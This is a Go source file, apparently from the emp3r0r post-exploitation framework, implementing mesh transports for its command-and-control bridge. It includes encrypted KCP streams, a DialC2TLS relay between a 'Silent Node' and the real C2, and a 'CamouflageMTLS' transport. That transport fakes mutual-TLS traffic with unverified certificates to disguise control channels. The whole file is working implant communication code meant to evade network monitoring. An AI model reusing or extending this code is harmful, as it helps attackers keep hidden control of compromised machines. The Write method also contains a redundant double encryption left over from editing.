package transport

// mesh_transport.go — thin helpers for the mesh bridge (mesh/bridge.go).
// These are intentionally minimal: they create a single KCP stream without
// the full smux session machinery used by KCPTunClient/KCPTunServer.

import (
	"context"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"crypto/sha1"
	"crypto/tls"
	"encoding/binary"
	"fmt"
	"io"
	"net"
	"sort"
	"sync"

	"golang.org/x/crypto/pbkdf2"

	kcp "github.com/xtaci/kcp-go/v5"
)

// meshKey derives a 32-byte AES key from password using PBKDF2.
func meshKey(password, salt string) []byte {
	return pbkdf2.Key([]byte(password), []byte(salt), 4096, 32, sha1.New)
}

// DialKCP creates a single encrypted KCP stream (AES-256 block cipher) to addr.
// addr is "host:port". password and salt are used to derive the AES-256 key.
// Returns a net.Conn wrapping the KCP session stream.
func DialKCP(addr, password, salt string) (net.Conn, error) {
	key := meshKey(password, salt)
	block, err := kcp.NewAESBlockCrypt(key)
	if err != nil {
		return nil, fmt.Errorf("DialKCP: block cipher: %v", err)
	}
	sess, err := kcp.DialWithOptions(addr, block, 10, 3)
	if err != nil {
		return nil, fmt.Errorf("DialKCP: dial %s: %v", addr, err)
	}
	// Mirror fast-mode settings from KCPTunClient defaults.
	sess.SetNoDelay(1, 10, 2, 1)
	sess.SetWindowSize(128, 1024)
	sess.SetMtu(1350)
	sess.SetACKNoDelay(false)
	return sess, nil
}

// ListenKCP creates a persistent, encrypted KCP listener on kcpPort.
// Caller is responsible for closing it (e.g. when ctx is done).
// Use AcceptKCPConn to accept individual connections from the returned listener.
func ListenKCP(kcpPort, password, salt string) (*kcp.Listener, error) {
	key := meshKey(password, salt)
	block, err := kcp.NewAESBlockCrypt(key)
	if err != nil {
		return nil, fmt.Errorf("ListenKCP: block cipher: %v", err)
	}
	l, err := kcp.ListenWithOptions(":"+kcpPort, block, 10, 3)
	if err != nil {
		return nil, fmt.Errorf("ListenKCP: listen :%s: %v", kcpPort, err)
	}
	return l, nil
}

// AcceptKCPConn accepts the next KCP connection from an existing listener.
// Blocks until a connection arrives or ctx is done.
func AcceptKCPConn(l *kcp.Listener, ctx context.Context) (net.Conn, error) {
	type result struct {
		conn *kcp.UDPSession
		err  error
	}
	ch := make(chan result, 1)
	go func() {
		conn, err := l.AcceptKCP()
		ch <- result{conn, err}
	}()

	select {
	case <-ctx.Done():
		return nil, ctx.Err()
	case r := <-ch:
		if r.err != nil {
			return nil, fmt.Errorf("AcceptKCPConn: %v", r.err)
		}
		r.conn.SetNoDelay(1, 10, 2, 1)
		r.conn.SetWindowSize(128, 1024)
		r.conn.SetMtu(1350)
		return r.conn, nil
	}
}

// DialC2TLS dials the C2 address using a standard TLS connection (via optional proxy).
// Returns a net.Conn that is the raw TLS socket — the mesh bridge uses this to pipe
// bytes between a Silent Node and the real C2 without decrypting.
func DialC2TLS(c2Addr, proxy string) (net.Conn, error) {
	client := CreateEmp3r0rHTTPClient(c2Addr, proxy)
	if client == nil || client.Transport == nil {
		return nil, fmt.Errorf("DialC2TLS: failed to initialize HTTP client for %s", c2Addr)
	}

	transport, ok := client.Transport.(interface {
		DialContext(ctx context.Context, network, addr string) (net.Conn, error)
	})
	if !ok {
		// Fallback: use plain TCP (TLS termination is done by the caller's TLS layer)
		host := c2Addr
		// strip scheme
		for _, pfx := range []string{"https://", "http://"} {
			if len(host) > len(pfx) && host[:len(pfx)] == pfx {
				host = host[len(pfx):]
			}
		}
		return net.Dial("tcp", host)
	}
	return transport.DialContext(context.Background(), "tcp", c2Addr)
}

// -----------------------------------------------------------------------------
// CamouflageMTLS: Stealth Transport
// -----------------------------------------------------------------------------

// MeshTransport provides a common interface for different mesh transport implementations.
type MeshTransport interface {
	Dial(addr, password, salt string) (net.Conn, error)
	Listen(port, password, salt string) (net.Listener, error)
	Accept(ctx context.Context, l net.Listener) (net.Conn, error)
}

// Transports is a registry of mesh transports, using sync.Map for thread-safety
// as per project knowledge mandate for high-concurrency disjoint write patterns.
var Transports sync.Map

// TransportDescriptor holds metadata and implementation for a mesh transport.
type TransportDescriptor struct {
	Name        string
	Description string
	Transport   MeshTransport
}

// RegisterTransport adds a new transport to the registry.
func RegisterTransport(name, desc string, t MeshTransport) {
	Transports.Store(name, &TransportDescriptor{
		Name:        name,
		Description: desc,
		Transport:   t,
	})
}

// GetTransportImplementation retrieves the implementation for a named transport.
// Defaults to mtls if not found.
func GetTransportImplementation(name string) MeshTransport {
	val, ok := Transports.Load(name)
	if !ok {
		// Fallback to mtls
		val, ok = Transports.Load("mtls")
		if !ok {
			return nil
		}
	}
	td, ok := val.(*TransportDescriptor)
	if !ok {
		return nil
	}
	return td.Transport
}

// AllTransportNames returns a sorted list of registered transport names.
func AllTransportNames() []string {
	var names []string
	Transports.Range(func(key, value any) bool {
		names = append(names, key.(string))
		return true
	})
	sort.Strings(names)
	return names
}

func init() {
	RegisterTransport("kcp", "Reliable UDP transport via KCP", KCPTransport{})
	RegisterTransport("mtls", "Camouflage mTLS transport with AES-GCM", CamouflageMTLS{})
}

// KCPTransport wraps the existing KCP implementation.
type KCPTransport struct{}

func (t KCPTransport) Dial(addr, password, salt string) (net.Conn, error) {
	return DialKCP(addr, password, salt)
}

func (t KCPTransport) Listen(port, password, salt string) (net.Listener, error) {
	return ListenKCP(port, password, salt)
}

func (t KCPTransport) Accept(ctx context.Context, l net.Listener) (net.Conn, error) {
	kcpListener, ok := l.(*kcp.Listener)
	if !ok {
		return nil, fmt.Errorf("KCPTransport: listener is not a *kcp.Listener")
	}
	return AcceptKCPConn(kcpListener, ctx)
}

// CamouflageMTLS implements a Stealth Transport using unverified mTLS.
// Wire traffic is indistinguishable from strict mTLS, but the "Auth" is
// actually handled by the inner AES-GCM payload cipher.
type CamouflageMTLS struct {
	CertOrg string
	CertCN  string
}

// Dial connects to a peer, performs a "Fake mTLS" handshake, and upgrades to AES-GCM.
func (t CamouflageMTLS) Dial(addr, password, salt string) (net.Conn, error) {
	// 1. Generate Ephemeral Client Cert
	clientCert, err := GenerateEphemeralCert(t.CertOrg, t.CertCN)
	if err != nil {
		return nil, fmt.Errorf("gen ephemeral cert: %v", err)
	}

	// 2. Configure TLS to ignore server cert CA (Camouflage: accept any cert)
	conf := &tls.Config{
		Certificates:       []tls.Certificate{clientCert},
		InsecureSkipVerify: true,
		MinVersion:         tls.VersionTLS13,
	}

	// 3. Dial TLS
	conn, err := tls.Dial("tcp", addr, conf)
	if err != nil {
		return nil, fmt.Errorf("tls dial: %v", err)
	}

	// 4. Upgrade to Real Security (AES-GCM Frame Wrapper)
	return NewGCMConn(conn, password, salt)
}

// Listen creates a TLS listener that enforces the "Look" of mTLS.
func (t CamouflageMTLS) Listen(port, password, salt string) (net.Listener, error) {
	// 1. Generate Ephemeral Server Cert
	serverCert, err := GenerateEphemeralCert(t.CertOrg, t.CertCN)
	if err != nil {
		return nil, err
	}

	// 2. Configure TLS to require ANY client cert, but not verify CA
	conf := &tls.Config{
		Certificates: []tls.Certificate{serverCert},
		ClientAuth:   tls.RequireAnyClientCert,
		MinVersion:   tls.VersionTLS13,
	}

	// 3. Listen TLS
	l, err := tls.Listen("tcp", ":"+port, conf)
	if err != nil {
		return nil, err
	}

	return &CamouflageListener{Listener: l, Password: password, Salt: salt}, nil
}

// CamouflageListener wraps net.Listener to automatically upgrade connections to AES-GCM.
type CamouflageListener struct {
	net.Listener
	Password string
	Salt     string
}

func (cl *CamouflageListener) Accept() (net.Conn, error) {
	conn, err := cl.Listener.Accept()
	if err != nil {
		return nil, err
	}

	// Upgrade to AES-GCM payload security
	gcmConn, err := NewGCMConn(conn, cl.Password, cl.Salt)
	if err != nil {
		conn.Close()
		return nil, err
	}

	return gcmConn, nil
}

func (t CamouflageMTLS) Accept(ctx context.Context, l net.Listener) (net.Conn, error) {
	// standard net.Listener accept, we must wrap it to respect ctx
	type acceptRes struct {
		c   net.Conn
		err error
	}
	ch := make(chan acceptRes, 1)
	go func() {
		c, e := l.Accept()
		ch <- acceptRes{c, e}
	}()
	select {
	case <-ctx.Done():
		return nil, ctx.Err()
	case res := <-ch:
		return res.c, res.err
	}
}

// -----------------------------------------------------------------------------
// GCMConn: AES-GCM Length-Prefixed Frame Wrapper for net.Conn
// -----------------------------------------------------------------------------

// NewGCMConn derives a key and sets up a wrapped connection with AES-GCM frame security.
func NewGCMConn(conn net.Conn, password, salt string) (net.Conn, error) {
	key := meshKey(password, salt)

	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}

	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}

	return &GCMConn{
		Conn: conn,
		aead: gcm,
	}, nil
}

// GCMConn represents a connection secured by AES-GCM encapsulating all reads and writes
// within length-prefixed frames to operate over a stream protocol.
type GCMConn struct {
	net.Conn
	aead cipher.AEAD

	// Optional: We can maintain separate nonces/counters for R/W for stronger security
	// but a random nonce per frame is also acceptable for simpler implementation.
	// For strict stream sync, counters are better. Using random nonce for simplicity.
	// Read buffer for unconsumed decrypted data from the previous frame
	readBuf []byte
}

func (c *GCMConn) Read(b []byte) (n int, err error) {
	// If we have leftover unconsumed decrypted data, return it immediately
	if len(c.readBuf) > 0 {
		n = copy(b, c.readBuf)
		c.readBuf = c.readBuf[n:]
		return n, nil
	}

	// Read frame length (4 bytes LE)
	lenBuf := make([]byte, 4)
	if _, err := io.ReadFull(c.Conn, lenBuf); err != nil {
		return 0, err
	}
	frameLen := int(binary.LittleEndian.Uint32(lenBuf))

	// Max reasonable frame check 64MB to prevent OOM
	if frameLen > 64*1024*1024 {
		return 0, fmt.Errorf("GCMConn: payload too large: %d", frameLen)
	}

	// Read full encrypted frame (Nonce + Ciphertext)
	encryptedFrame := make([]byte, frameLen)
	if _, err := io.ReadFull(c.Conn, encryptedFrame); err != nil {
		return 0, err
	}

	nonceSize := c.aead.NonceSize()
	if len(encryptedFrame) < nonceSize {
		return 0, fmt.Errorf("GCMConn: frame too small")
	}

	nonce, ciphertext := encryptedFrame[:nonceSize], encryptedFrame[nonceSize:]

	// Decrypt
	plaintext, err := c.aead.Open(nil, nonce, ciphertext, nil)
	if err != nil {
		return 0, fmt.Errorf("GCMConn decrypt frame: %v", err)
	}

	// Copy to caller's buffer
	n = copy(b, plaintext)

	// Keep remainder in readBuf
	if n < len(plaintext) {
		c.readBuf = plaintext[n:]
	}

	return n, nil
}

func (c *GCMConn) Write(b []byte) (n int, err error) {
	nonceSize := c.aead.NonceSize()

	// Generate random nonce for this frame
	nonce := make([]byte, nonceSize)
	if _, err := io.ReadFull(rand.Reader, nonce); err != nil {
		return 0, fmt.Errorf("GCMConn get nonce: %v", err)
	}

	// Encrypt the frame
	ciphertext := c.aead.Seal(nil, nonce, b, nil)

	// Frame format: [Length: 4 bytes LE][Nonce][Ciphertext]
	// Calculate total frame length
	frameLen := uint32(len(nonce) + len(ciphertext))
	lenBuf := make([]byte, 4)
	binary.LittleEndian.PutUint32(lenBuf, frameLen)

	// Write length
	if _, err := c.Conn.Write(lenBuf); err != nil {
		return 0, err
	}

	// Write Nonce + Ciphertext (we can write them sequentially or prepend nonce into ciphertext buffer)
	// Since Seal appends to the dst slice, we can efficiently allocate one slice for both

	// Let's re-do the seal to save a write operation and allocation
	// Frame Format: [Nonce][Ciphertext]
	frameBuf := make([]byte, nonceSize, nonceSize+len(b)+c.aead.Overhead())
	copy(frameBuf, nonce)
	frameBuf = c.aead.Seal(frameBuf, nonce, b, nil)

	if _, err := c.Conn.Write(frameBuf); err != nil {
		return 0, err
	}

	return len(b), nil
}
